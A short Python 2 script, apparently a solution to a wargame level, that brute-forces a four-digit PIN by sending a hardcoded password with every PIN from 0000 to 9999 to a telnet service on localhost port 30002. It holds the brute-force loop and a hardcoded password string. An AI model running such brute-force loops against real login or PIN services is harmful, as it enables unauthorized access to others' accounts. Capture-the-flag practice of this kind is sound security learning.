def pinify(number):
    if number < 10:
        pin = "000"
    elif number < 100:
        pin = "00"
    elif number < 1000:
        pin = "0"
    else:
        pin = ""

    pin += str(number)
    return pin

if __name__ == "__main__":
    from telnetlib import Telnet
    
    pwd = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

    tn = Telnet("localhost", 30002)
    tn.read_until("space.") # blabla I am the pincode checker bla
    
    for i in range(10000):
        pin = pinify(i)
        tn.write(pwd + " " + pin + "\n")
        res = tn.read_until("\n")
        if len(res) == 1:
            res = tn.read_until("\n")

        if "Wrong" not in res:
            print "success at pin " + pin + " ! " + res
            break

